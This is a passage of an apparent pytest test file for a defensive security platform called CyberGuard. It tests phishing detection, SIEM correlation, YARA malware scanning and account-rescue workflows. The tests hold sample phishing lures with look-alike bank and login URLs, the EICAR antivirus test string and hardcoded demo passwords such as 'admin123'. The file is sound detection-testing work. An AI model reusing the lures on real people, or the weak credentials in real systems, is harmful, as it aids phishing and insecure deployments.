    monkeypatch.setattr(flower.fl.client, "start_client", lambda **kwargs: client_call.update(kwargs))
    with pytest.raises(ValueError, match="require a trusted root certificate"):
        flower.start_client(dataset, "10.0.0.8:9010")
    root_certificate = tmp_path / "root.pem"
    root_certificate.write_bytes(b"root-cert")
    flower.start_client(dataset, "10.0.0.8:9010", root_certificate)
    assert client_call["server_address"] == "10.0.0.8:9010"
    assert client_call["root_certificates"] == b"root-cert"
    assert client_call["insecure"] is False


def test_dashboard_target_summary_ranks_entities_and_masks_identifiers():
    targets = summarize_dashboard_targets([
        {"payload": "Contact alice.smith@example.org at https://login.example.org/auth", "risk_score": 85},
        {"payload": "Repeat alert for alice.smith@example.org and https://login.example.org/reset", "risk_score": 40},
        {"payload": "Source 203.0.113.42 connected to https://other.example.net", "risk_score": 75},
    ])

    user_target = next(target for target in targets if target["type"] == "user")
    service_target = next(target for target in targets if target["label"] == "login.example.org")
    network_target = next(target for target in targets if target["type"] == "network")
    assert user_target["label"] == "a***@example.org"
    assert user_target["incident_count"] == 2
    assert user_target["high_risk_count"] == 1
    assert service_target["incident_count"] == 2
    assert network_target["label"] == "203.0.113.x"


def test_phishing_scan_scores_signal_content_not_static_baseline():
    result = scan_payload("URGENT verify credentials at http://bput-results.xyz from attacker@example.com")
    assert result["risk_score"] >= 45
    assert result["safe"] is False


def test_admin_and_threat_intel_routes():
    initialize_database()
    admin = login(LoginRequest(username="admin", password="admin123"))["user"]
    assert admin_users(admin)["users"]
    assert compliance_controls(admin)["controls"]
    assert threat_intel_lookup(ThreatIntelLookup(value="8.8.8.8"), admin)["results"]


def test_compliance_controls_do_not_claim_unverified_scores():
    controls = compliance_controls({"username": "admin", "role": "admin"})["controls"]

    assert all(control["status"] == "Self-assessed" for control in controls)
    assert all(control["score"] is None for control in controls)


def test_websocket_pushes_new_incident_metadata_for_authenticated_user(tmp_path, monkeypatch):
    from fastapi.testclient import TestClient

    monkeypatch.setattr(main, "DB_PATH", tmp_path / "events.db")
    initialize_database()
    session = login(LoginRequest(username="lead", password="lead123"))
    token = session["access_token"]

    with TestClient(main.app).websocket_connect(
        "/api/v1/ws/events",
        subprotocols=[token, "cyberguard.events.v1"],
    ) as websocket:
        assert websocket.receive_json() == {"type": "ready"}
        incident_id = main.store_incident(
            "url",
            "malicious example",
            {"risk_score": 75, "risk_level": "High"},
        )

        event = websocket.receive_json()

    assert event["type"] == "incident_created"
    assert event["incident"]["id"] == incident_id
    assert event["incident"]["category"] == "url"
    assert "payload" not in event["incident"]


def test_cyberguard_x_artifacts_are_available():
    initialize_database()
    lead = login(LoginRequest(username="lead", password="lead123"))["user"]
    result = analyze_threat(ThreatAnalysisRequest(category="url", payload="Urgent verify at https://secure-login.xyz/auth"), lead)
    incident_id = result["incident_id"]
    assert incident_genome(incident_id, lead)["genome"]["fingerprint"]
    assert incident_correlations(incident_id, lead)["campaign_id"]
    timeline = incident_attack_chain(incident_id, lead)["events"]
    assert {event["type"] for event in timeline} == {
        "incident_created",
        "analysis_completed",
        "campaign_correlated",
    }
    assert all(event["timestamp"] for event in timeline)
    assert all(event["type"] not in {"signal", "triage", "response"} for event in timeline)
    main.update_incident(incident_id, main.IncidentUpdate(status="Contained"), lead)
    timeline = incident_attack_chain(incident_id, lead)["events"]
    assert timeline[-1]["type"] == "workflow_updated"
    assert threat_forecast(ForecastRequest(horizon=3), lead)["forecast"][-1]["step"] == 3
    assert incident_simulation(incident_id, SimulationRequest(actions=["isolate", "revoke"]), lead)["projected_risk"] < result["assessment"]["risk_score"]


def test_campaign_correlation_requires_shared_evidence():
    incident = {
        "id": 1,
        "category": "email",
        "payload": "unrelated account notice",
        "assessment": {"iocs": [], "mitre_techniques": []},
    }
    unrelated = {
        "id": 2,
        "category": "email",
        "payload": "different unrelated account notice",
        "assessment": {"iocs": [], "mitre_techniques": []},
    }
    shared_indicator = {
        **unrelated,
        "id": 3,
        "assessment": {"iocs": [{"type": "domain", "indicator": "login.example.test"}], "mitre_techniques": []},
    }
    incident["assessment"]["iocs"] = [{"type": "domain", "indicator": "login.example.test"}]

    unrelated_result = correlate_incident(incident, [unrelated])
    shared_result = correlate_incident(incident, [shared_indicator])

    assert unrelated_result["related_incidents"] == []
    assert shared_result["related_incidents"][0]["incident_id"] == 3


def test_shared_immunity_signatures_require_evidence_and_hide_metadata():
    incident = {
        "id": 7,
        "category": "phishing",
        "risk_level": "Critical",
        "fingerprint": "known-fingerprint",
        "payload": "private customer credential lure",
    }
    result = shared_immunity([incident], signing_secret="exchange-secret")

    assert result["signature_count"] == 1
    assert set(result["shared_signatures"][0]) == {"signature"}
    assert "private customer" not in json.dumps(result)
    assert "Critical" not in json.dumps(result)
    assert shared_immunity([{"category": "phishing", "payload": ""}])["signature_count"] == 0
    evidence_only = shared_immunity([{"category": "phishing", "assessment": {"iocs": [{"type": "domain", "indicator": "login.example.test"}], "mitre_techniques": None}}], signing_secret="exchange-secret")
    assert evidence_only["signature_count"] == 1


def test_shared_immunity_publish_uses_configured_installation_identity(monkeypatch):
    monkeypatch.delenv("CYBERGUARD_TENANT_ID", raising=False)
    with pytest.raises(HTTPException) as error:
        roadmap_immunity_publish({}, {"username": "lead", "role": "head_admin"})
    assert error.value.status_code == 503

    monkeypatch.setenv("CYBERGUARD_TENANT_ID", "stable-org-id")
    monkeypatch.setenv("CYBERGUARD_TENANT_IMMUNITY_SECRET", "exchange-secret")
    monkeypatch.setattr("main._roadmap_incidents", lambda: [{"id": 1, "fingerprint": "incident-fingerprint"}])
    captured = {}
    monkeypatch.setattr(
        "main.publish_tenant_signatures",
        lambda signatures, tenant_id: captured.update({"signatures": signatures, "tenant_id": tenant_id}) or {"status": "published", "published": len(signatures)},
    )

    result = roadmap_immunity_publish(
        {"tenant_id": "caller-controlled-id", "signatures": [{"signature": "untrusted", "source_tenant": "analyst@example.org"}]},
        {"username": "lead", "role": "head_admin"},
    )

    assert result["status"] == "published"
    assert captured["tenant_id"] == "stable-org-id"
    assert len(captured["signatures"]) == 1
    assert set(captured["signatures"][0]) == {"signature"}


def test_threat_memory_uses_resolved_history_and_matches_exact_payloads():
    payload = "Urgent verify your credentials at login.example.test"
    open_match = detect_memory_hits(payload, [{"id": 5, "payload": payload, "status": "Investigating", "risk_score": 90}])
    resolved_match = detect_memory_hits(payload, [{"id": 6, "payload": payload, "status": "Closed", "risk_score": 90}])

    assert open_match["status"] == "fresh-analysis"
    assert resolved_match["status"] == "memory-hit"
    assert resolved_match["matches"][0]["match_score"] == 100


def test_attacker_intent_uses_shared_ioc_evidence_from_related_incidents():
    incident = {
        "id": 1,
        "category": "phishing",
        "risk_score": 50,
        "payload": "verify credentials at login.example.test",
        "assessment": {"iocs": [{"type": "domain", "indicator": "login.example.test"}], "mitre_techniques": []},
    }
    same_category_only = {"id": 2, "category": "phishing", "risk_score": 80, "assessment": {"iocs": [], "mitre_techniques": []}}
    shared_ioc = {"id": 3, "category": "email", "risk_score": 60, "assessment": {"iocs": [{"type": "domain", "indicator": "login.example.test"}], "mitre_techniques": []}}

    intent = generate_attacker_intent(incident, [same_category_only, shared_ioc])

    assert [item["incident_id"] for item in intent["related_incidents"]] == [3]
    assert intent["confidence"] > generate_attacker_intent(incident)["confidence"]
    assert "corroborated" in intent["summary"]


def test_fingerprint_drift_ignores_unrelated_evidence_free_incidents():
    incident = {"id": 1, "category": "phishing", "payload": "account notice", "assessment": {"iocs": [], "mitre_techniques": []}}
    unrelated = {"id": 2, "category": "phishing", "payload": "different notice", "assessment": {"iocs": [], "mitre_techniques": []}}
    related = {"id": 3, "category": "email", "payload": "account notice", "assessment": {"iocs": [{"type": "domain", "indicator": "login.example.test"}], "mitre_techniques": ["T1566"]}}
    incident["assessment"] = {"iocs": [{"type": "domain", "indicator": "login.example.test"}], "mitre_techniques": ["T1566"]}

    unrelated_result = compute_drift_snapshot({**incident, "assessment": {"iocs": [], "mitre_techniques": []}}, [unrelated])
    related_result = compute_drift_snapshot(incident, [related])

    assert unrelated_result["related_incidents"] == []
    assert related_result["related_incidents"][0]["incident_id"] == 3


def test_siem_dhcp_and_idp_correlation_workflow():
    initialize_database()
    lead = login(LoginRequest(username="lead", password="lead123"))["user"]

    event = siem_ingest_event(
        {
            "source_ip": "192.168.1.99",
            "event_type": "suspicious_login",
            "severity": "CRITICAL",
            "details": "User attempted unauthorized admin access from untrusted host",
            "source_host": "Unknown-Kali-Linux",
        },
        lead,
    )
    assert event["threat_level"] in {"HIGH", "CRITICAL"}
    assert event["correlated_log"]["hostname"] == "Unknown-Kali-Linux"
    assert read_siem_events(lead)["events"]

    auth = idp_authenticate_user(
        {
            "username": "user_admin",
            "password": "admin123",
            "source_ip": "192.168.1.10",
            "service_provider_app": "CYBERGUARD SOC",
        },
        lead,
    )
    assert auth["auth_status"] == "SUCCESS"

    blocked = idp_authenticate_user(
        {
            "username": "user_admin",
            "password": "admin123",
            "source_ip": "192.168.1.99",
            "service_provider_app": "CYBERGUARD SOC",
        },
        lead,
    )
    assert blocked["auth_status"] == "BLOCKED"


def test_idp_allows_trusted_login_with_low_severity_success_event(tmp_path, monkeypatch):
    monkeypatch.setattr(main, "DB_PATH", tmp_path / "idp-siem.db")
    initialize_database()
    lead = {"username": "lead", "role": "lead"}
    siem_ingest_event(
        {
            "source_ip": "192.168.1.10",
            "event_type": "authentication_success",
            "severity": "LOW",
            "source_host": "Admin-Workstation",
        },
        lead,
    )

    auth = idp_authenticate_user(
        {"username": "user_admin", "password": "admin123", "source_ip": "192.168.1.10"},
        lead,
    )

    assert auth["auth_status"] == "SUCCESS"


def test_cors_allows_only_configured_origins():
    cors = next(middleware for middleware in main.app.user_middleware if middleware.cls.__name__ == "CORSMiddleware")

    expected_origins = [origin.strip() for origin in main.configured_origins.split(",") if origin.strip()]
    assert cors.kwargs["allow_origins"] == expected_origins
    assert cors.kwargs.get("allow_origin_regex") is None


def test_siem_demo_seed_is_persistent_and_idempotent(tmp_path, monkeypatch):
    monkeypatch.setattr("main.DB_PATH", tmp_path / "siem.db")
    initialize_database()
    user = {"username": "lead", "role": "lead"}

    first = siem_demo_seed(user)
    second = siem_demo_seed(user)

    assert first["seeded"] is True
    assert second["seeded"] is False
    assert first["count"] == second["count"] == 3


def test_sprint_1_intelligence_signals_are_available():
    initialize_database()
    lead = login(LoginRequest(username="lead", password="lead123"))["user"]
    result = analyze_threat(
        ThreatAnalysisRequest(
            category="email",
            payload="URGENT verify credentials at https://secure-login.xyz/auth?session=abc from admin@company.com",
        ),
        lead,
    )
    incident_id = result["incident_id"]

    assert incident_intent(incident_id, lead)["confidence"] >= 50
    assert incident_drift(incident_id, lead)["drift_score"] >= 0
    assert incident_memory(incident_id, lead)["status"] in {"memory-hit", "fresh-analysis"}
    explainability = incident_explainability(incident_id, lead)
    assert explainability["contribution_status"] == "available"
    assert explainability["risk_score"] == result["assessment"]["risk_score"]

    outcome = record_alert_outcome(incident_id, "phishing", result["assessment"]["risk_score"], "malicious", "lead")
    report = alert_quality(lead)
    assert outcome["was_correct"] is True
    assert report["overall_score"] >= 0


def test_alert_outcomes_are_persisted_in_configured_database(tmp_path, monkeypatch):
    monkeypatch.setattr("main.DB_PATH", tmp_path / "feedback.db")
    initialize_database()

    outcome = record_alert_outcome(incident_id=77, detection_type="phishing", alert_risk_score=84, final_resolution="false_positive", reviewed_by="lead")
    report = alert_quality()
    with get_db() as db:
        stored = db.execute("SELECT incident_id, final_resolution, was_correct FROM alert_outcomes WHERE incident_id = ?", (77,)).fetchone()

    assert outcome["was_correct"] is False
    assert stored["final_resolution"] == "false_positive"
    assert report["overall_score"] == 0
    assert report["detection_types"]["phishing"] == 0


def test_alert_feedback_reviewer_comes_from_authenticated_user(tmp_path, monkeypatch):
    monkeypatch.setattr("main.DB_PATH", tmp_path / "reviewer.db")
    initialize_database()

    outcome = alert_quality_record(
        {"incident_id": 91, "detection_type": "phishing", "alert_risk_score": 84, "final_resolution": "malicious", "reviewed_by": "someone-else"},
        {"username": "lead", "role": "lead"},
    )

    assert outcome["reviewed_by"] == "lead"


def test_adversarial_self_test_exposes_confidence_decay():
    result = adversarial_self_test("email", "URGENT verify credentials at https://secure-login.xyz/auth?redirect=evil")
    assert result["baseline_score"] >= 0
    assert result["adversarial_probes"]
    assert result["confidence_decay"] >= 0


def test_adversarial_self_test_excludes_unchanged_and_duplicate_probes():
    payload = "URGENT verify your PASSWORD immediately"
    result = adversarial_self_test("email", payload)
    variants = [probe["variant"] for probe in result["adversarial_probes"]]

    assert variants
    assert all(variant != payload for variant in variants)
    assert len(variants) == len(set(variants))


def test_defender_fatigue_routing_prioritizes_lightest_load():
    result = fatigue_routing(
        [
            {"database_id": 1, "risk_score": 87, "status": "Investigating", "assigned_to": "analyst"},
            {"database_id": 2, "risk_score": 70, "status": "New", "assigned_to": "lead"},
            {"database_id": 3, "risk_score": 92, "status": "New", "assigned_to": None},
        ],
        [
            {"username": "analyst", "role": "analyst"},
            {"username": "lead", "role": "lead"},
            {"username": "sub_admin", "role": "sub_admin"},
        ],
    )
    assert result["route_summary"]["available_analysts"] >= 1
    assert result["recommended_queue"][0]["target"] in {"analyst", "lead", "sub_admin"}


def test_fatigue_routing_counts_active_work_and_excludes_resolved_incidents():
    result = fatigue_routing(
        [
            {"database_id": 1, "risk_score": 90, "status": "Investigating", "assigned_to": "analyst-a"},
            {"database_id": 2, "risk_score": 70, "status": "New", "assigned_to": None},
            {"database_id": 3, "risk_score": 80, "status": "Closed", "assigned_to": "analyst-b"},
        ],
        [
            {"username": "analyst-a", "role": "analyst"},
            {"username": "analyst-b", "role": "analyst"},
        ],
    )

    queue = {item["incident_id"]: item for item in result["recommended_queue"]}
    assert queue[2]["target"] == "analyst-b"
    assert 3 not in queue

    no_roster = fatigue_routing([{"database_id": 4, "risk_score": 60, "status": "New"}], [])
    assert no_roster["recommended_queue"][0]["target"] == "unassigned"
    assert no_roster["route_summary"]["available_analysts"] == 0


def test_remaining_roadmap_features_return_safe_operational_artifacts():
    incident = {
        "database_id": 42,
        "id": "INC-42",
        "category": "phishing",
        "risk_score": 88,
        "risk_level": "Critical",
        "status": "Investigating",
        "assigned_to": "analyst",
        "payload": "targeted redirect campaign from registrar with custom domain",
        "metadata": {"country": "IN"},
        "fingerprint": "abc123",
    }
    assert breach_economics(incident)["total_exposure"] > 0
    assert len(seed_honeytokens(incident)["tokens"]) == 3
    assert analyst_bias_report([incident])["analysts"][0]["analyst"] == "analyst"
    assert shared_immunity([incident])["signature_count"] == 1
    assert attacker_resource_cost(incident)["tier"] in {"commodity", "organized", "custom campaign"}
    assert attention_heatmap([{"resource": "incidents"}])["surfaces"][0]["surface"] == "incidents"
    assert jurisdiction_route(incident)["jurisdiction"] == "India"


def test_jurisdiction_requires_and_persists_explicit_residency_metadata(tmp_path, monkeypatch):
    monkeypatch.setattr("main.DB_PATH", tmp_path / "jurisdiction.db")
    initialize_database()
    lead = {"username": "lead", "role": "lead"}

    missing = jurisdiction_route({"risk_score": 40})
    result = analyze_threat(
        ThreatAnalysisRequest(category="email", payload="Routine account notice", metadata={"country": "United States"}),
        lead,
    )
    stored_incident = incident_context(result["incident_id"])
    routed = jurisdiction_route(stored_incident)

    assert missing["jurisdiction"] == "Unknown / global review"
    assert stored_incident["metadata"]["country"] == "United States"
    assert routed["country"] == "US"
    assert routed["jurisdiction"] == "United States"


def test_website_analysis_persists_incident_and_jurisdiction_metadata(tmp_path, monkeypatch):
    monkeypatch.setattr("main.DB_PATH", tmp_path / "website-analysis.db")
    initialize_database()
    monkeypatch.setattr("main.inspect_website", lambda url: {"final_url": url, "title": "Account verification", "findings": ["look-alike login page"]})

    result = analyze_website(
        {"url": "https://login.example.test", "metadata": {"country": "GB"}},
        {"username": "lead", "role": "lead"},
    )
    stored = incident_context(result["incident_id"])

    assert stored["metadata"]["country"] == "GB"
    assert jurisdiction_route(stored)["jurisdiction"] == "United Kingdom"


def test_uploaded_file_analysis_persists_residency_metadata(tmp_path, monkeypatch):
    monkeypatch.setattr("main.DB_PATH", tmp_path / "file-analysis.db")
    initialize_database()

    result = asyncio.run(analyze_file(
        category="email",
        file=UploadFile(file=io.BytesIO(b"routine account notice"), filename="notice.txt"),
        metadata=json.dumps({"country": "EU", "private_note": "discard this"}),
        user={"username": "lead", "role": "lead"},
    ))
    stored = incident_context(result["incident_id"])

    assert stored["metadata"] == {"country": "EU"}
    assert jurisdiction_route(stored)["jurisdiction"] == "European Union"


def test_limited_roadmap_workflows_are_functional():
    incident = {"database_id": 7, "risk_score": 80, "category": "deepfake"}
    media = cross_modal_consistency([{"score": 20, "method": "image"}, {"score": 48, "method": "audio"}])
    assert media["media_count"] == 2
    assert media["status"] == "cross-modal mismatch"
    replay = counterfactual_replay(incident, ["isolate"], "response_delay_hours", 30)
    assert replay["counterfactual_risk"] > replay["baseline_risk"]
    diff = compliance_diff([{"id": "control-1", "status": "Needs Review"}], [{"id": "CVE-TEST", "severity": "high"}])
    assert diff["gap_count"] == 2


def test_supply_chain_blast_radius_propagates_only_through_supplied_dependencies():
    nodes = [
        {"id": "vendor", "name": "Shared package vendor", "criticality": "high"},
        {"id": "service-a", "name": "Payments API", "criticality": "critical"},
        {"id": "service-b", "name": "Analytics", "criticality": "medium"},
        {"id": "unrelated", "name": "Unrelated system", "criticality": "low"},
    ]
    dependencies = [
        {"supplier": "vendor", "dependent": "service-a"},
        {"source": "service-a", "target": "service-b"},
        {"supplier": "service-b", "dependent": "vendor"},
    ]

    result = supply_chain_blast_radius(nodes, dependencies, ["vendor"])

    assert result["affected_count"] == 2
    assert [node["id"] for node in result["affected_nodes"]] == ["service-a", "service-b"]
    assert next(node for node in result["affected_nodes"] if node["id"] == "service-b")["dependency_chain"] == [
        "vendor",
        "service-a",
        "service-b",
    ]
    assert result["mode"].startswith("data-driven simulation")
    assert "unrelated" not in {node["id"] for node in result["affected_nodes"]}


def test_supply_chain_blast_radius_rejects_unknown_graph_references():
    with pytest.raises(ValueError, match="unknown node"):
        supply_chain_blast_radius(
            [{"id": "vendor"}],
            [{"supplier": "vendor", "dependent": "unknown"}],
            ["vendor"],
        )

    with pytest.raises(HTTPException) as error:
        main.roadmap_supply_chain(
            {"nodes": [{"id": "vendor"}], "dependencies": [], "compromised_nodes": ["unknown"]},
            {"username": "lead", "role": "lead"},
        )
    assert error.value.status_code == 422

    result = main.roadmap_supply_chain(
        {
            "nodes": [{"id": "vendor"}, {"id": "service"}],
            "dependencies": [{"supplier": "vendor", "dependent": "service"}],
            "compromised_nodes": ["vendor"],
        },
        {"username": "lead", "role": "lead"},
    )
    assert result["affected_count"] == 1
    assert result["affected_nodes"][0]["id"] == "service"


def test_counterfactual_replay_rejects_unmodeled_variables_and_actions():
    incident = {"database_id": 9, "risk_score": 70}

    with pytest.raises(ValueError, match="Unsupported counterfactual variable"):
        counterfactual_replay(incident, ["isolate"], "attacker_skill", 4)
    with pytest.raises(ValueError, match="Unsupported response action"):
        counterfactual_replay(incident, ["grant-admin-access"], "response_delay_hours", 4)


def test_counterfactual_api_returns_validation_errors_for_unmodeled_input(monkeypatch):
    monkeypatch.setattr("main.incident_context", lambda incident_id: {"database_id": incident_id, "risk_score": 70})
    user = {"username": "lead", "role": "lead"}

    with pytest.raises(HTTPException) as error:
        roadmap_counterfactual(9, {"actions": ["isolate"], "variable": "attacker_skill", "value": 4}, user)
    assert error.value.status_code == 422

    with pytest.raises(HTTPException) as error:
        roadmap_counterfactual(9, {"actions": "isolate", "variable": "response_delay_hours", "value": 4}, user)
    assert error.value.status_code == 422


def test_synced_cves_persist_and_feed_subsequent_compliance_diffs(tmp_path, monkeypatch):
    monkeypatch.setattr("main.DB_PATH", tmp_path / "cve-sync.db")
    initialize_database()
    monkeypatch.setattr("main.sync_cve_feed", lambda: {
        "status": "synced",
        "configured": True,
        "source": "test-feed",
        "cves": ["CVE-2026-1000"],
        "items": [{"id": "CVE-2026-1000", "severity": "critical"}],
    })
    user = {"username": "lead", "role": "lead"}

    synced = roadmap_compliance_diff_sync(user)
    subsequent = roadmap_compliance_diff({"cves": []}, user)

    assert synced["diff"]["cve_count"] == 1
    assert any(gap.get("id") == "CVE-2026-1000" for gap in subsequent["gaps"])


def test_cross_modal_consistency_requires_distinct_valid_media_channels():
    same_modality = cross_modal_consistency([
        {"score": 20, "media_type": "image/png", "method": "image-anomaly-model"},
        {"score": 48, "media_type": "image/jpeg", "method": "image-anomaly-model"},
    ])
    invalid = cross_modal_consistency([
        {"score": "not-a-score", "media_type": "image/png", "method": "image-anomaly-model"},
        {"score": float("nan"), "media_type": "audio/wav", "method": "audio-anomaly-model"},
        {"score": 99, "media_type": "video/mp4", "method": "metadata-fallback"},
    ])

    assert same_modality["status"] == "insufficient evidence"
    assert same_modality["media_count"] == 1
    assert invalid["status"] == "insufficient evidence"
    assert invalid["media_count"] == 0


def test_prevention_engine_features_are_functional():
    decision = risk_aware_prevention_decision({
        "risk_score": 92,
        "category": "email",
        "payload": "URGENT verify credentials at http://evil-login.example/login",
        "asset_criticality": "critical",
    }, {"role": "admin", "team": "finance"})
    assert decision["action"] in {"block", "isolate", "require_mfa"}
    assert decision["score"] >= 80

    campaign = campaign_aware_prevention([
        {"payload": "URGENT verify at https://secure-login.example", "user": "analyst@org.com"},
        {"payload": "URGENT verify at https://secure-login.example", "user": "lead@org.com"},
    ])
    assert campaign["campaign_id"]
    assert campaign["watch_status"] in {"monitoring", "blocking", "contained"}

    trust = identity_trust_evaluation({"country": "US", "device": "new-device", "login_count": 3, "source_ip": "203.0.113.14"})
    assert trust["trust_score"] >= 0
    assert trust["status"] in {"trusted", "review", "blocked"}

    insider = insider_threat_risk({"downloads": 9, "off_hours": True, "privilege_change": True, "sensitive_access": 5})
    assert insider["risk_score"] >= 50

    decoy = deception_trigger_check([{"type": "honeytoken", "host": "finance-host-01", "user": "finance-user"}])
    assert decoy["trigger_status"] == "triggered"

    containment = containment_action_plan({"risk_score": 90, "source_ip": "198.51.100.10", "category": "email"})
    assert containment["actions"]

    cross = cross_channel_prevention_score({
        "email_risk": 88,
        "url_risk": 76,
        "device_risk": 70,
        "login_risk": 82,
        "campaign_similarity": 0.8,
    })
    assert cross["final_score"] >= 70

    policy = policy_aware_prevention({"role": "admin"}, {"criticality": "critical"}, {"category": "url"})
    assert policy["enforcement_level"] in {"strict", "standard", "monitor"}


def test_account_rescue_engine_scans_plans_and_requires_confirmation():
    scan = scan_account({"provider": "google", "forwarding_rule": True, "mfa_enabled": False, "new_oauth_app": True})
    assert scan["risk_level"] in {"HIGH", "CRITICAL"}
    assert scan["top_contributors"]
    plan = rescue_plan(scan)
    assert plan["honesty_note"]
    step = execute_step(plan, "remove_forwarding")
    assert step["status"] == "confirmation_required"
    manual = execute_step(plan, "remove_forwarding", confirmed=True)
    assert manual["status"] == "manual_required"


def test_account_rescue_supporting_features_are_safe_and_explicit():
    scan = scan_account({"provider": "microsoft", "mfa_enabled": False})
    plan = rescue_plan(scan)
    simulation = rescue_simulation(scan)
    report = rescue_report(scan, plan)
    assert simulation["side_effects"] is False
    assert simulation["risk_after"] <= simulation["risk_before"]
    assert report["export_format"]
    assert provider_capabilities("microsoft")["passwords_collected"] is False
    assert consent_record("google", ["readonly"], "scan")["status"] == "awaiting_confirmation"
    assert contact_warning_draft("demo", ["a@example.com"])["requires_explicit_send"] is True
    assert fleet_summary([{"label": "finance", "risk": 90, "consent": True}])["accounts"][0]["rescue_available"] is True


def test_regional_scam_detection_requires_correlated_signals():
    benign = "Urgent payment transfer for the government officer refund."
    scam = "Police says digital arrest. Do not disconnect and transfer money now."

    assert analyze_regional_scam(benign)[0] == 0
    assert "digital-arrest" in analyze_regional_scam(scam)[4]


def test_auth_log_and_ato_categories_share_the_same_scorer(monkeypatch):
    monkeypatch.setattr(detection_engine, "model_signal", lambda payload: (0, None))
    payload = '{"failed_attempts": 8, "total_attempts": 10, "distinct_accounts": 6, "new_device": true}'

    ato = detection_engine.evaluate_threat_payload("ato", payload)
    auth_logs = detection_engine.evaluate_threat_payload("auth_logs", payload)

    assert ato["risk_score"] == auth_logs["risk_score"]
    assert ato["detection_method"] == auth_logs["detection_method"] == "shared-authentication-risk"


def test_url_intelligence_flags_expanded_brand_lookalikes():
    score, reasons, _ = detection_engine.analyze_url_intelligence("https://sbi-account-verify.online/login")

    assert score >= 55
    assert any("look-alike" in reason.lower() or "typosquatting" in reason.lower() for reason in reasons)


def test_brand_domains_load_from_validated_configuration(tmp_path):
    config = tmp_path / "brands.json"
    config.write_text(json.dumps({"brands": {"sbi": "sbi.co.in", "custombank": "login.invalid_domain", "x": "short.com"}}), encoding="utf-8")

    assert detection_engine.load_brand_domains(config) == {"sbi": "sbi.co.in"}


def test_phishing_text_uses_contextual_risk_and_shared_url_intelligence(monkeypatch):
    monkeypatch.setattr(detection_engine, "model_signal", lambda payload: (0, None))
    benign = detection_engine.evaluate_threat_payload("email", "Urgent payment transfer for the government officer refund.")
    short_link = detection_engine.evaluate_threat_payload("sms", "Your KYC and OTP are required; use this link: https://bit.ly/secure-check")
    bank_spoof = detection_engine.evaluate_threat_payload("sms", "SBI account locked. Verify at https://sbi-account-lock.online/login")

    assert benign["risk_score"] < 20
    assert benign["regional_categories"] == []
    assert short_link["risk_score"] >= 55
    assert bank_spoof["risk_score"] >= 60


def test_login_baseline_learns_successful_samples_per_account(monkeypatch, tmp_path):
    monkeypatch.setattr("main.DB_PATH", tmp_path / "login-baseline.sqlite")
    initialize_database()
    user = {"username": "analyst"}

    for _ in range(3):
        assessment = {"risk_score": 5, "risk_level": "Safe", "indicators": [], "recommended_actions": [], "xai_explanation": "Baseline.", "explanation_summary": "Baseline."}
        main.apply_user_login_baseline(assessment, json.dumps({"account_id": "account-1", "success": True, "country": "IN", "device_id": "known-device", "hour": 9}), user)

    changed_device = {"risk_score": 5, "risk_level": "Safe", "indicators": [], "recommended_actions": [], "xai_explanation": "Baseline.", "explanation_summary": "Baseline."}
    main.apply_user_login_baseline(changed_device, json.dumps({"account_id": "account-1", "country": "IN", "device_id": "new-device", "hour": 9}), user, learn=False)
    other_account = {"risk_score": 5, "risk_level": "Safe", "indicators": [], "recommended_actions": [], "xai_explanation": "Baseline.", "explanation_summary": "Baseline."}
    main.apply_user_login_baseline(other_account, json.dumps({"account_id": "account-2", "country": "IN", "device_id": "new-device", "hour": 9}), user, learn=False)

    assert changed_device["risk_score"] == 30
    assert changed_device["login_baseline"] == {"status": "active", "samples": 3, "signals": 1}
    assert other_account["risk_score"] == 5
    assert other_account["login_baseline"]["status"] == "calibrating"

    monkeypatch.setattr(main, "lookup_geoip_country", lambda address: {"status": "located", "country": "US"})
    changed_country = {"risk_score": 5, "risk_level": "Safe", "indicators": [], "recommended_actions": [], "xai_explanation": "Baseline.", "explanation_summary": "Baseline."}
    main.apply_user_login_baseline(changed_country, json.dumps({"account_id": "account-1", "country": "IN", "source_ip": "8.8.8.8", "device_id": "known-device", "hour": 9}), user, learn=False)

    assert changed_country["risk_score"] == 25
    assert changed_country["geoip"] == {"status": "located", "country": "US"}


def test_geoip_lookup_validates_addresses_and_reads_local_country_database(monkeypatch, tmp_path):
    database = tmp_path / "GeoLite2-Country.mmdb"
    database.write_bytes(b"test")
    country_result = types.SimpleNamespace(country=types.SimpleNamespace(iso_code="US"))
    monkeypatch.setattr(geoip_enrichment, "_reader", lambda path: types.SimpleNamespace(country=lambda address: country_result))

    assert geoip_enrichment.lookup_country("8.8.8.8", str(database)) == {"status": "located", "country": "US"}
    assert geoip_enrichment.lookup_country("127.0.0.1", str(database))["status"] == "non_public_address"
    assert geoip_enrichment.lookup_country("invalid", str(database))["status"] == "invalid_address"


def test_malware_scanner_reports_yara_matches_and_unavailable_runtime(monkeypatch):
    class FakeMatch:
        rule = "Test_Signature"
        namespace = "default"
        meta = {"risk_score": 91}

    class FakeRules:
        def match(self, data):
            return [FakeMatch()] if b"test signature" in data else []

    class FakeYara:
        @staticmethod
        def compile(filepath):
            return FakeRules()

    monkeypatch.setattr(malware_scanner, "_load_yara", lambda: FakeYara())
    detected = malware_scanner.scan_artifact(b"test signature", "sample.bin")
    clean_result = malware_scanner.scan_artifact(b"ordinary data", "sample.bin")
    monkeypatch.setattr(malware_scanner, "_load_yara", lambda: (_ for _ in ()).throw(ImportError()))
    unavailable = malware_scanner.scan_artifact(b"ordinary data", "sample.bin")

    assert detected["status"] == "matches_found"
    assert detected["risk_score"] == 91
    assert clean_result["status"] == "scanned_no_match"
    assert "not proof" in clean_result["reasons"][0]
    assert unavailable["status"] == "unavailable"


def test_bundled_yara_rules_detect_the_eicar_test_string():
    eicar = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"

    result = malware_scanner.scan_artifact(eicar, "eicar.com")

    assert result["status"] == "matches_found"
    assert result["risk_score"] == 99
    assert result["matches"][0]["rule"] == "EICAR_Antivirus_Test_File"


def test_uploaded_malware_scan_updates_final_risk_and_explanation(monkeypatch, tmp_path):
    monkeypatch.setattr("main.DB_PATH", tmp_path / "malware-upload.sqlite")
    initialize_database()
    monkeypatch.setattr("main.scan_artifact", malware_scanner.scan_artifact)
    monkeypatch.setattr("main.analyze_media", lambda *args: {"score": 0, "indicators": [], "reasons": [], "method": "unsupported-file"})
    monkeypatch.setattr("main.persist_cyberguard_x", lambda *args, **kwargs: None)
    monkeypatch.setattr("main.write_audit", lambda *args, **kwargs: None)
    monkeypatch.setattr("main.create_notification", lambda *args, **kwargs: None)
    monkeypatch.setattr("main.evaluate_threat_payload", lambda category, payload: {
        "risk_score": 5,
        "risk_level": "Safe",
        "indicators": [],
        "recommended_actions": [{"id": "warn_user", "label": "Warn"}],
